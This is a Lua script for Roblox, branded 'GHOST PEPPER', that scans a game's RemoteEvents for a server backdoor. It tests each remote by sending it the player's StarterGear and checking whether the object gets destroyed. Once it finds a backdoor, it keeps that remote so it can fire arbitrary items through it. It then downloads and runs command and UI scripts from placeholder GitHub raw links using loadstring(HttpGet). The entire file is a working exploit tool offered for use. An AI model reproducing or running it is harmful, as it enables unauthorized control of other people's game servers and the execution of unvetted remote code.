local timer = 0
local backdoorfound = false
local vulnremote = nil
local safetime = 0.25

-- Branded hint
local hint = Instance.new("Hint", workspace)
hint.Text = "GHOST PEPPER: Scanning... (Check F9)"

-- Timer
coroutine.wrap(function()
    repeat
        timer += 0.01
        task.wait(0.01)
    until backdoorfound
end)()

-- Bindable event
local actionbind = Instance.new("BindableEvent", game.Players.LocalPlayer)
actionbind.Name = "GHOSTAction"
actionbind.Event:Connect(function(item)
    if backdoorfound then
        vulnremote:FireServer(item)
    end
end)

-- Test remote
local function testRemote(remote)
    local function fireTest(item)
        pcall(function()
            remote:FireServer(item)
        end)
    end
    local function isDestroyed(obj)
        return obj == nil or obj.Parent == nil
    end
    local testpart = game.Players.LocalPlayer.StarterGear
    fireTest(testpart)
    task.wait(safetime)
    print("GHOST PEPPER: "..remote.Name.." /Backdoor: "..tostring(isDestroyed(testpart)))
    if isDestroyed(testpart) then
        vulnremote = remote
        return true
    end
    return false
end

-- Scan game
local function scan()
    if backdoorfound then return end
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Parent and v.Parent.Name ~= "RobloxReplicatedStorage" then
            if testRemote(v) then
                backdoorfound = true
                print("GHOST PEPPER: Backdoor found!")
                return
            end
        end
    end
end

-- Main
task.wait(2)
scan()
if backdoorfound then
    hint.Text = "GHOST PEPPER: Backdoor found in "..tostring(timer).."s! (Remote: "..vulnremote.Name..")"
    -- Load scripts (replace with your GitHub links)
    loadstring(game:HttpGet("YOUR_GITHUB_RAW_LINK/GHOST_Commands.lua"))()
    loadstring(game:HttpGet("YOUR_GITHUB_RAW_LINK/GHOST_UI.lua"))()
    task.wait(10)
    hint:Destroy()
else
    hint.Text = "GHOST PEPPER: No backdoor found."
    task.wait(10)
    hint:Destroy()
end
